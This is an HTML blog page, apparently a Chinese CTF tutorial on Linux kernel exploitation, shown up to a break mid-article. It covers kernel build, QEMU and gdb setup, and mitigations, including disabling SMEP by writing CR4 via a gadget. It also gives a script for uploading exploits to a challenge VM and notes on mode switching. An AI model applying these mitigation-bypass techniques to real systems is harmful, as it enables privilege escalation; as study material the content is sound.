@@ -1,0 +1,2046 @@
+<!doctype html><html lang=zh-cn>
+<head>
+<meta charset=utf-8>
+<meta http-equiv=x-ua-compatible content="IE=edge,chrome=1">
+<title>Kernel Pwn: 从入门到入土 - hhdx's blog</title>
+<meta name=renderer content="webkit">
+<meta name=viewport content="width=device-width,initial-scale=1,maximum-scale=1">
+<meta http-equiv=cache-control content="no-transform">
+<meta http-equiv=cache-control content="no-siteapp">
+<meta name=theme-color content="#f8f5ec">
+<meta name=msapplication-navbutton-color content="#f8f5ec">
+<meta name=apple-mobile-web-app-capable content="yes">
+<meta name=apple-mobile-web-app-status-bar-style content="#f8f5ec">
+<meta name=author content="hhdx"><meta name=description content="MISC 内核文件区别 vmlinux 是静态链接的可执行文件，未压缩的内核，最原始的文件，可以用来调试。
+vmlinuz 是可引导的、压缩的内核。没有调试信息等数据，不可用于调试。启动时会自解压，通常会显示以下信息
+1 2  Decompressing Linux... done Booting the kernel.   zImage 是经过压缩的小内核（小于512KB）。
+bzImage 是经过压缩的大内核（大于512KB）。
+Initial Ramdisk 名字类似initramfs.cpio 文件，一般可以使用cpio读取其中的文件。
+1 2  $ find . | cpio -o --format=newc &amp;gt; initramfs.cpio # compress $ sudo cpio -idmv &amp;lt; initramfs.cpio # depress   有时也经过了gzip的压缩。
+1 2 3  $ mv initramfs.cpio initramfs.cpio.gz $ gunzip initramfs.cpio.gz	# 解压得到initramfs.cpio $ cpio -idmv &amp;lt; initramfs.cpio   更改为正确的后缀之后，图形界面“归档管理器”也可以打开。
+"><meta name=keywords content="C language,CTF,system engineer">
+<meta name=generator content="Hugo 0.87.0 with theme even">
+<link rel=canonical href=https://hhdx.xyz/post/kernel-pwn-%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F/>
+<link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png>
+<link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png>
+<link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png>
+<link rel=manifest href=/manifest.json>
+<link rel=mask-icon href=/safari-pinned-tab.svg color=#5bbad5>
+<link href=/sass/main.min.0d3b8ec8ed7df891edf32830bfdc6af5976dc6b9ffeb7cd1d0cdd312bcf8e23e.css rel=stylesheet>
+<link rel=stylesheet href=https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.css integrity="sha256-7TyXnr2YU040zfSP+rEcz29ggW4j56/ujTPwjMzyqFY=" crossorigin=anonymous>
+<meta property="og:title" content="Kernel Pwn: 从入门到入土">
+<meta property="og:description" content="MISC
+内核文件区别
+vmlinux 是静态链接的可执行文件，未压缩的内核，最原始的文件，可以用来调试。
+vmlinuz 是可引导的、压缩的内核。没有调试信息等数据，不可用于调试。启动时会自解压，通常会显示以下信息
+
+
+1
+2
+
+
+Decompressing Linux... done
+Booting the kernel.
+
+
+zImage 是经过压缩的小内核（小于512KB）。
+bzImage 是经过压缩的大内核（大于512KB）。
+Initial Ramdisk
+名字类似initramfs.cpio 文件，一般可以使用cpio读取其中的文件。
+
+
+1
+2
+
+
+$ find . | cpio -o --format=newc > initramfs.cpio # compress
+$ sudo cpio -idmv < initramfs.cpio # depress
+
+
+有时也经过了gzip的压缩。
+
+
+1
+2
+3
+
+
+$ mv initramfs.cpio initramfs.cpio.gz
+$ gunzip initramfs.cpio.gz	# 解压得到initramfs.cpio
+$ cpio -idmv < initramfs.cpio
+
+
+更改为正确的后缀之后，图形界面“归档管理器”也可以打开。">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://hhdx.xyz/post/kernel-pwn-%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F/"><meta property="article:section" content="post">
+<meta property="article:published_time" content="2020-10-25T19:12:40+00:00">
+<meta property="article:modified_time" content="2020-10-25T19:12:40+00:00">
+<meta itemprop=name content="Kernel Pwn: 从入门到入土">
+<meta itemprop=description content="MISC
+内核文件区别
+vmlinux 是静态链接的可执行文件，未压缩的内核，最原始的文件，可以用来调试。
+vmlinuz 是可引导的、压缩的内核。没有调试信息等数据，不可用于调试。启动时会自解压，通常会显示以下信息
+
+
+1
+2
+
+
+Decompressing Linux... done
+Booting the kernel.
+
+
+zImage 是经过压缩的小内核（小于512KB）。
+bzImage 是经过压缩的大内核（大于512KB）。
+Initial Ramdisk
+名字类似initramfs.cpio 文件，一般可以使用cpio读取其中的文件。
+
+
+1
+2
+
+
+$ find . | cpio -o --format=newc > initramfs.cpio # compress
+$ sudo cpio -idmv < initramfs.cpio # depress
+
+
+有时也经过了gzip的压缩。
+
+
+1
+2
+3
+
+
+$ mv initramfs.cpio initramfs.cpio.gz
+$ gunzip initramfs.cpio.gz	# 解压得到initramfs.cpio
+$ cpio -idmv < initramfs.cpio
+
+
+更改为正确的后缀之后，图形界面“归档管理器”也可以打开。"><meta itemprop=datePublished content="2020-10-25T19:12:40+00:00">
+<meta itemprop=dateModified content="2020-10-25T19:12:40+00:00">
+<meta itemprop=wordCount content="7936">
+<meta itemprop=keywords content="Kernel Pwn,CTF,"><meta name=twitter:card content="summary">
+<meta name=twitter:title content="Kernel Pwn: 从入门到入土">
+<meta name=twitter:description content="MISC
+内核文件区别
+vmlinux 是静态链接的可执行文件，未压缩的内核，最原始的文件，可以用来调试。
+vmlinuz 是可引导的、压缩的内核。没有调试信息等数据，不可用于调试。启动时会自解压，通常会显示以下信息
+
+
+1
+2
+
+
+Decompressing Linux... done
+Booting the kernel.
+
+
+zImage 是经过压缩的小内核（小于512KB）。
+bzImage 是经过压缩的大内核（大于512KB）。
+Initial Ramdisk
+名字类似initramfs.cpio 文件，一般可以使用cpio读取其中的文件。
+
+
+1
+2
+
+
+$ find . | cpio -o --format=newc > initramfs.cpio # compress
+$ sudo cpio -idmv < initramfs.cpio # depress
+
+
+有时也经过了gzip的压缩。
+
+
+1
+2
+3
+
+
+$ mv initramfs.cpio initramfs.cpio.gz
+$ gunzip initramfs.cpio.gz	# 解压得到initramfs.cpio
+$ cpio -idmv < initramfs.cpio
+
+
+更改为正确的后缀之后，图形界面“归档管理器”也可以打开。"><!--[if lte IE 9]><script src=https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js></script><![endif]--><!--[if lt IE 9]><script src=https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js></script>
+<script src=https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js></script><![endif]-->
+</head>
+<body>
+<div id=mobile-navbar class=mobile-navbar>
+<div class=mobile-header-logo>
+<a href=/ class=logo>hhdx's blog</a>
+</div>
+<div class=mobile-navbar-icon>
+<span></span>
+<span></span>
+<span></span>
+</div>
+</div>
+<nav id=mobile-menu class="mobile-menu slideout-menu">
+<ul class=mobile-menu-list>
+<a href=/>
+<li class=mobile-menu-item>Home</li>
+</a><a href=/post/>
+<li class=mobile-menu-item>Archives</li>
+</a><a href=/tags/>
+<li class=mobile-menu-item>Tags</li>
+</a><a href=/links/>
+<li class=mobile-menu-item>Links</li>
+</a><a href=/about/>
+<li class=mobile-menu-item>About</li>
+</a>
+</ul>
+</nav>
+<div class=container id=mobile-panel>
+<header id=header class=header>
+<div class=logo-wrapper>
+<a href=/ class=logo>hhdx's blog</a>
+</div>
+<nav class=site-navbar>
+<ul id=menu class=menu>
+<li class=menu-item>
+<a class=menu-item-link href=/>Home</a>
+</li><li class=menu-item>
+<a class=menu-item-link href=/post/>Archives</a>
+</li><li class=menu-item>
+<a class=menu-item-link href=/tags/>Tags</a>
+</li><li class=menu-item>
+<a class=menu-item-link href=/links/>Links</a>
+</li><li class=menu-item>
+<a class=menu-item-link href=/about/>About</a>
+</li>
+</ul>
+</nav>
+</header>
+<main id=main class=main>
+<div class=content-wrapper>
+<div id=content class=content>
+<article class=post>
+<header class=post-header>
+<h1 class=post-title>Kernel Pwn: 从入门到入土</h1>
+<div class=post-meta>
+<span class=post-time> 2020-10-25 </span>
+</div>
+</header>
+<div class=post-toc id=post-toc>
+<h2 class=post-toc-title>文章目录</h2>
+<div class="post-toc-content always-active">
+<nav id=TableOfContents>
+<ul>
+<li>
+<ul>
+<li><a href=#misc>MISC</a>
+<ul>
+<li><a href=#内核文件区别>内核文件区别</a></li>
+<li><a href=#initial-ramdisk>Initial Ramdisk</a></li>
+</ul>
+</li>
+<li><a href=#compile-kernel>Compile kernel</a></li>
+<li><a href=#qemu>Qemu</a></li>
+<li><a href=#debug>Debug</a></li>
+<li><a href=#mitigation>Mitigation</a>
+<ul>
+<li><a href=#smep>SMEP</a></li>
+<li><a href=#smap>SMAP</a></li>
+<li><a href=#mmap_min_addr>MMAP_MIN_ADDR</a></li>
+</ul>
+</li>
+<li><a href=#upload脚本>upload脚本</a></li>
+<li><a href=#预备知识>预备知识</a>
+<ul>
+<li><a href=#loadable-kernel-moduleslkms3>Loadable Kernel Modules(LKMs)[3]</a></li>
+<li><a href=#状态切换3>状态切换[3]</a></li>
+<li><a href=#内核态函数3>内核态函数[3]</a></li>
+</ul>
+</li>
+<li><a href=#题目>题目</a>
+<ul>
+<li><a href=#ret2usr--rootme-buffer-overflow-basic-1httpswwwroot-meorgenchallengesapp-systemlinkern-x86-buffer-overflow-basic-1>ret2usr | <a href=https://www.root-me.org/en/Challenges/App-System/LinKern-x86-Buffer-overflow-basic-1>Rootme buffer overflow basic 1</a></a></li>
+<li><a href=#uaf--rop--ciscn2017-babydriver>UAF & ROP | CISCN2017 babydriver</a></li>
+</ul>
+</li>
+<li><a href=#error>ERROR</a></li>
+<li><a href=#编译加载简单module>编译加载简单module</a>
+<ul>
+<li><a href=#1-编译内核>1. 编译内核</a></li>
+<li><a href=#2-编译busybox>2. 编译busybox</a></li>
+<li><a href=#3-编写编译module>3. 编写编译module</a></li>
+<li><a href=#4-启动系统>4. 启动系统</a></li>
+</ul>
+</li>
+<li><a href=#to-do-list>to do list</a></li>
+<li><a href=#参考>参考</a></li>
+</ul>
+</li>
+</ul>
+</nav>
+</div>
+</div>
+<div class=post-content>
+<h2 id=misc>MISC</h2>
+<h3 id=内核文件区别>内核文件区别</h3>
+<p><code>vmlinux</code> 是静态链接的可执行文件，未压缩的内核，最原始的文件，可以用来调试。</p>
+<p><code>vmlinuz</code> 是可引导的、压缩的内核。没有调试信息等数据，不可用于调试。启动时会自解压，通常会显示以下信息</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback>Decompressing Linux... done
+Booting the kernel.
+</code></pre></td></tr></table>
+</div>
+</div><p><code>zImage</code> 是经过压缩的小内核（小于512KB）。</p>
+<p><code>bzImage</code> 是经过压缩的大内核（大于512KB）。</p>
+<h3 id=initial-ramdisk>Initial Ramdisk</h3>
+<p>名字类似<code>initramfs.cpio</code> 文件，一般可以使用cpio读取其中的文件。</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>$ find . <span class=p>|</span> cpio -o --format<span class=o>=</span>newc &gt; initramfs.cpio <span class=c1># compress</span>
+$ sudo cpio -idmv &lt; initramfs.cpio <span class=c1># depress</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>有时也经过了gzip的压缩。</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>$ mv initramfs.cpio initramfs.cpio.gz
+$ gunzip initramfs.cpio.gz	<span class=c1># 解压得到initramfs.cpio</span>
+$ cpio -idmv &lt; initramfs.cpio
+</code></pre></td></tr></table>
+</div>
+</div><p>更改为正确的后缀之后，图形界面“归档管理器”也可以打开。</p>
+<p><span id=jump1></span></p>
+<h2 id=compile-kernel>Compile kernel</h2>
+<p>Host: Ubuntu 20.04</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>$ wget https://cdn.kernel.org/pub/linux/kernel/v5.x/linux-5.4.72.tar.xz <span class=c1># get link from kernel.org</span>
+$ xz -d -v linux-5.4.72.tar.xz
+$ tar xvf linux-5.4.72.tar
+$ <span class=nb>cd</span> linux-5.4.72
+$ cp -v /boot/config-<span class=k>$(</span>uname -r<span class=k>)</span> .config
+$ sudo apt-get install build-essential libncurses-dev bison flex libssl-dev libelf-dev
+$ make menuconfig <span class=c1># optional, 此项设置好之后除非必要，尽量不要改动，否则会完全的重新编译</span>
+$ make <span class=c1># make -j $(nproc)</span>
+</code></pre></td></tr></table>
+</div>
+</div><h2 id=qemu>Qemu</h2>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback>-m 指定内存大小
+-nographic 没有图形界面，同时影响串并口
+-kernel 指定启动内核
+-machine 选择模拟的机器 -machine help显示所有
+    -accel 选择加速，有kvm、xen等等
+-append 添加内核启动选项
+-monitor 重定向monitor到主机设备，图形模式默认到vc，非图形模式默认到stdio
+-fsdev 定义一个新的文件系统设备
+    与-device virtio-9t-同用
+    -device virtio-9p-type,fsdev=id,mount_tag=mount_tag
+-enable-kvm 启用kvm全虚拟化支持
+-initrd 将文件用作起始ram disk
+-hda/b/c/d 将文件用作硬盘0/1/2/3
+-snapshot 写入临时文件，而不是映像文件。（可以强制写回
+</code></pre></td></tr></table>
+</div>
+</div><h2 id=debug>Debug</h2>
+<p>使用qemu的<code>-s</code>选项，默认将会在1234端口开启gdb server。如果 1234 号端口用不了，也可以换成 -gdb tcp::[port num]</p>
+<p>加断点的话，CTRL+C打断 gdb，输入就行。</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>$ lsmod <span class=c1># 查看加载的模块</span>
+$ cat /sys/module/basic1_ch1/sections/.text <span class=c1># 依次获取.text .bss .data加载地址</span>
+<span class=o>(</span>gdb<span class=o>)</span>$ target remote :1234 <span class=c1># 连接到本地调试端口</span>
+<span class=o>(</span>gdb<span class=o>)</span>$ add-symbol-file ./tostring.ko 0xc3827000 -s .bss 0xc3827600 -s .data 0xc3827360 <span class=c1># 在gdb中加载符号</span>
+</code></pre></td></tr></table>
+</div>
+</div><h2 id=mitigation>Mitigation</h2>
+<h3 id=smep>SMEP</h3>
+<p>全称Supervisor Mode Execution Protection，当处理器处于 ring 0 模式，执行用户空间的代码会触发页错误。（在 arm 中该保护称为 PXN)。</p>
+<p>系统根据 CR4 寄存器的值判断是否开启 smep 保护，当 CR4 寄存器的第 20 位是 1 时，保护开启；是 0 时，保护关闭。</p>
+<p><img src=https://raw.githubusercontent.com/clxsh/pics/master/imgCR4.jpg alt=CR4></p>
+<p>CR4 寄存器是可以通过 mov 指令修改的。从vmlinux中提取gadget，可以达到这个目的。</p>
+<p>gdb无法查看CR4寄存器的值，可以通过kernel crash时的信息来查看。关闭SMEP保护，常用一个固定的值0x6f0,即<code>mov cr4, 0x6f0</code>。</p>
+<h3 id=smap>SMAP</h3>
+<p>Superivisor Mode Access Protection，类似于 SMEP，当处理器处于 ring 0 模式，访问用户空间的数据会触发页错误。</p>
+<h3 id=mmap_min_addr>MMAP_MIN_ADDR</h3>
+<ul>
+<li>MMAP_MIN_ADDR：控制着mmap能够映射的最低内存地址，防止用户非法分配并访问低地址数据。</li>
+</ul>
+<h2 id=upload脚本>upload脚本</h2>
+<p>用于将poc或exp上传到主机。</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=ch>#!/usr/bin/env python3</span>
+<span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
+<span class=kn>import</span> <span class=nn>os</span>
+
+<span class=n>prompt</span> <span class=o>=</span> <span class=s2>&#34;$ &#34;</span>
+
+<span class=k>def</span> <span class=nf>upload</span><span class=p>(</span><span class=n>name</span><span class=p>):</span>
+    <span class=n>io</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=n>prompt</span><span class=p>,</span> <span class=s2>&#34;stty -echo&#34;</span><span class=p>)</span>    <span class=c1># 关闭回显</span>
+    <span class=n>os</span><span class=o>.</span><span class=n>system</span><span class=p>(</span><span class=s2>&#34;gcc -static -m32 -O2 ./</span><span class=si>{}</span><span class=s2>.c -o </span><span class=si>{}</span><span class=s2>&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>name</span><span class=p>,</span> <span class=n>name</span><span class=p>))</span> <span class=c1># 普通gcc编译。musl-gcc编译32bit出错</span>
+    <span class=n>os</span><span class=o>.</span><span class=n>system</span><span class=p>(</span><span class=s2>&#34;gzip -c </span><span class=si>{}</span><span class=s2> &gt; </span><span class=si>{}</span><span class=s2>.gz&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>name</span><span class=p>,</span> <span class=n>name</span><span class=p>))</span>
+
+    <span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=s2>&#34;</span><span class=si>{}</span><span class=s2>.gz&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>name</span><span class=p>),</span> <span class=s2>&#34;rb&#34;</span><span class=p>)</span> <span class=k>as</span> <span class=n>f</span><span class=p>:</span>
+        <span class=n>content</span> <span class=o>=</span> <span class=n>f</span><span class=o>.</span><span class=n>read</span><span class=p>()</span>
+    
+    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;len: </span><span class=si>%d</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=nb>len</span><span class=p>(</span><span class=n>content</span><span class=p>))</span>
+    <span class=n>encoded</span> <span class=o>=</span> <span class=n>base64</span><span class=o>.</span><span class=n>b64encode</span><span class=p>(</span><span class=n>content</span><span class=p>)</span>
+    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;len: </span><span class=si>%d</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=nb>len</span><span class=p>(</span><span class=n>encoded</span><span class=p>))</span>
+    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=nb>len</span><span class=p>(</span><span class=n>encoded</span><span class=p>),</span> <span class=mi>1000</span><span class=p>):</span>    <span class=c1># 文件过大会出现上传不完整，后来改成1000就可以</span>
+        <span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s2>&#34;echo </span><span class=se>\&#34;</span><span class=si>{}</span><span class=se>\&#34;</span><span class=s2> &gt;&gt; </span><span class=si>{}</span><span class=s2>.gz.b64&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>encoded</span><span class=p>[</span><span class=n>i</span><span class=p>:</span><span class=n>i</span><span class=o>+</span><span class=mi>1000</span><span class=p>]</span><span class=o>.</span><span class=n>decode</span><span class=p>(</span><span class=s2>&#34;ascii&#34;</span><span class=p>),</span> <span class=n>name</span><span class=p>)</span> <span class=p>)</span>
+    
+    <span class=n>io</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=n>prompt</span><span class=p>,</span> <span class=s2>&#34;base64 -d </span><span class=si>{}</span><span class=s2>.gz.b64 &gt; </span><span class=si>{}</span><span class=s2>.gz&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>name</span><span class=p>,</span> <span class=n>name</span><span class=p>))</span>
+    <span class=n>io</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=n>prompt</span><span class=p>,</span> <span class=s2>&#34;gunzip </span><span class=si>{}</span><span class=s2>.gz&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>name</span><span class=p>))</span>
+    <span class=n>io</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=n>prompt</span><span class=p>,</span> <span class=s2>&#34;chmod +x </span><span class=si>{}</span><span class=s2>&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>name</span><span class=p>))</span>
+    <span class=n>io</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=n>prompt</span><span class=p>,</span> <span class=s2>&#34;./</span><span class=si>{}</span><span class=s2>&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>name</span><span class=p>))</span>
+    <span class=n>io</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
+    
+
+<span class=n>io</span> <span class=o>=</span> <span class=n>process</span><span class=p>(</span><span class=s2>&#34;./._start_vm&#34;</span><span class=p>,</span> <span class=n>shell</span><span class=o>=</span><span class=kc>True</span><span class=p>)</span>
+<span class=n>upload</span><span class=p>(</span><span class=s2>&#34;poc&#34;</span><span class=p>)</span>
+
+<span class=c1># session = ssh(USER, HOST, PORT, PW) # ssh连接的情况</span>
+<span class=c1># io = session.run(&#34;/bin/sh&#34;)</span>
+</code></pre></td></tr></table>
+</div>
+</div><h2 id=预备知识>预备知识</h2>
+<h3 id=loadable-kernel-moduleslkms3>Loadable Kernel Modules(LKMs)[3]</h3>
+<p>可加载核心模块 (或直接称为内核模块) 就像运行在内核空间的可执行程序，包括:</p>
+<p><img src=https://raw.githubusercontent.com/clxsh/pics/master/imgLKM.jpg alt=LKM></p>
+<p>LKMs 的文件格式和用户态的可执行程序相同，Linux 下为 ELF，Windows 下为 exe/dll，mac 下为 MACH-O，因此我们可以用 IDA 等工具来分析内核模块。</p>
+<p>模块可以被单独编译，但不能单独运行。它在运行时被链接到内核作为内核的一部分在内核空间运行，这与运行在用户控件的进程不同。</p>
+<p>模块通常用来实现一种文件系统、一个驱动程序或者其他内核上层的功能。</p>
+<blockquote>
+<p>Linux 内核之所以提供模块机制，是因为它本身是一个单内核 (monolithic kernel)。单内核的优点是效率高，因为所有的内容都集合在一起，但缺点是可扩展性和可维护性相对较差，模块机制就是为了弥补这一缺陷。</p>
+</blockquote>
+<h4 id=相关指令>相关指令</h4>
+<ol>
+<li><strong>insmod</strong>: 将指定模块加载到内核中。</li>
+<li><strong>rmmod</strong>: 从内核中卸载指定模块。</li>
+<li><strong>lsmod</strong>: 列出已经加载的模块。</li>
+<li><strong>modprobe</strong>: 添加或删除模块，modprobe 在加载模块时会查找依赖关系。</li>
+</ol>
+<h4 id=file_operations结构体>file_operations结构体</h4>
+<p>用户进程在对设备文件进行诸如read/write操作的时候，<strong>系统调用通过设备文件的主设备号找到相应的设备驱动程序，然后读取这个数据结构相应的函数指针，接着把控制权交给该函数，这是Linux的设备驱动程序工作的基本原理。</strong></p>
+<p>内核模块程序的结构中包括一些call back回调表，对应的函数存储在一个file_operations(fop)结构体中，这也是相当重要的结构体，结构体中实现了的回调函数就会静态初始化函数地址，而未实现的函数，值为NULL。例如：</p>
+<table>
+<thead>
+<tr>
+<th style=text-align:center>Events</th>
+<th style=text-align:center>User functions</th>
+<th style=text-align:center>Kernel functions</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style=text-align:center>load</td>
+<td style=text-align:center>insmod</td>
+<td style=text-align:center>module_init()</td>
+</tr>
+<tr>
+<td style=text-align:center>open</td>
+<td style=text-align:center>fopen</td>
+<td style=text-align:center>file_operations: open</td>
+</tr>
+<tr>
+<td style=text-align:center>read</td>
+<td style=text-align:center>fread</td>
+<td style=text-align:center>file_operations: read</td>
+</tr>
+<tr>
+<td style=text-align:center>write</td>
+<td style=text-align:center>fwrite</td>
+<td style=text-align:center>file_operations: write</td>
+</tr>
+<tr>
+<td style=text-align:center>close</td>
+<td style=text-align:center>fclose</td>
+<td style=text-align:center>file_operations: release</td>
+</tr>
+<tr>
+<td style=text-align:center>remove</td>
+<td style=text-align:center>rmmod</td>
+<td style=text-align:center>module_exit()</td>
+</tr>
+</tbody>
+</table>
+<h3 id=状态切换3>状态切换[3]</h3>
+<h4 id=user-space-to-kernel-space>user space to kernel space</h4>
+<p>当发生 <code>系统调用</code>，<code>产生异常</code>，<code>外设产生中断</code>等事件时，会发生用户态到内核态的切换，具体的过程为：</p>
+<ol>
+<li>通过 <code>swapgs</code> 切换 GS 段寄存器，将 GS 寄存器值和一个特定位置的值进行交换，目的是保存 GS 值，同时将该位置的值作为内核执行时的 GS 值使用。</li>
+<li>将当前栈顶（用户空间栈顶）记录在 CPU 独占变量区域里，将 CPU 独占区域里记录的内核栈顶放入 rsp/esp。</li>
+<li>通过 push 保存各寄存器值，具体的 <a href=http://elixir.free-electrons.com/linux/v4.12/source/arch/x86/entry/entry_64.S>代码</a> 如下:</li>
+</ol>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback>ENTRY(entry_SYSCALL_64)
+ /* SWAPGS_UNSAFE_STACK是一个宏，x86直接定义为swapgs指令 */
+ SWAPGS_UNSAFE_STACK
+   
+ /* 保存栈值，并设置内核栈 */
+ movq %rsp, PER_CPU_VAR(rsp_scratch)
+ movq PER_CPU_VAR(cpu_current_top_of_stack), %rsp
+   
+   
+/* 通过push保存寄存器值，形成一个pt_regs结构 */
+/* Construct struct pt_regs on stack */
+pushq  $__USER_DS      /* pt_regs-&gt;ss */
+pushq  PER_CPU_VAR(rsp_scratch)  /* pt_regs-&gt;sp */
+pushq  %r11             /* pt_regs-&gt;flags */
+pushq  $__USER_CS      /* pt_regs-&gt;cs */
+pushq  %rcx             /* pt_regs-&gt;ip */
+pushq  %rax             /* pt_regs-&gt;orig_ax */
+pushq  %rdi             /* pt_regs-&gt;di */
+pushq  %rsi             /* pt_regs-&gt;si */
+pushq  %rdx             /* pt_regs-&gt;dx */
+pushq  %rcx tuichu    /* pt_regs-&gt;cx */
+pushq  $-ENOSYS        /* pt_regs-&gt;ax */
+pushq  %r8              /* pt_regs-&gt;r8 */
+pushq  %r9              /* pt_regs-&gt;r9 */
+pushq  %r10             /* pt_regs-&gt;r10 */
+pushq  %r11             /* pt_regs-&gt;r11 */
+sub $(6*8), %rsp      /* pt_regs-&gt;bp, bx, r12-15 not saved */
+</code></pre></td></tr></table>
+</div>
+</div><ol start=4>
+<li>
+<p>通过汇编指令判断是否为 x32_abi。</p>
+</li>
+<li>
+<p>通过系统调用号，跳到全局变量 <code>sys_call_table</code> 相应位置继续执行系统调用。</p>
+</li>
+</ol>
+<h4 id=kernel-space-to-user-space>kernel space to user space</h4>
+<ol>
+<li>通过 <code>swapgs</code> 恢复 GS 值</li>
+<li>通过 <code>sysretq</code> 或者 <code>iretq</code> 恢复到用户控件继续执行。如果使用 <code>iretq</code> 还需要给出用户空间的一些信息（CS, eflags/rflags, esp/rsp 等）</li>
+</ol>
+<blockquote>
